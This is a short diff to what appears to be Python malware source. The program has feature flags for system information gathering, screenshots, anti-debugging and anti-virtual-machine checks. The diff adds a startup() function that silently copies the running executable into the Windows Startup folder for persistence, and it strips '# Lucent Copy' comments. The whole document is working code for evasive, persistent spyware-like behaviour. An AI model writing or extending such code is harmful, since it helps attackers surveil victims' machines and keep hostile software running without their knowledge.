@@ -440,6 +440,16 @@ def checker():
             pass
         sys.exit(1)
 
+def startup():
+    my = sys.executable
+    startupfolder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+    path = os.path.join(startupfolder, os.path.basename(my))
+
+    if my != path and not os.path.exists(path):
+        shutil.copy2(my, path)
+        print(f" ")
+    else:
+        print("  ")
 
 def main():
     feature = {
@@ -455,12 +465,12 @@ def main():
     if feature.get("systeminfo", False):
         machineinfo()
     if feature.get("screenshot", False):
-        screenshot() # Lucent Copy
+        screenshot() 
     if feature.get("anti_debug", False):
         anti_debugger() 
     if feature.get("anti_vm", False):
-        checker() # Lucent Copy
+        checker()
     if feature.get("startup", False):
-        print ("soon!")
+        startup()
 
 main()
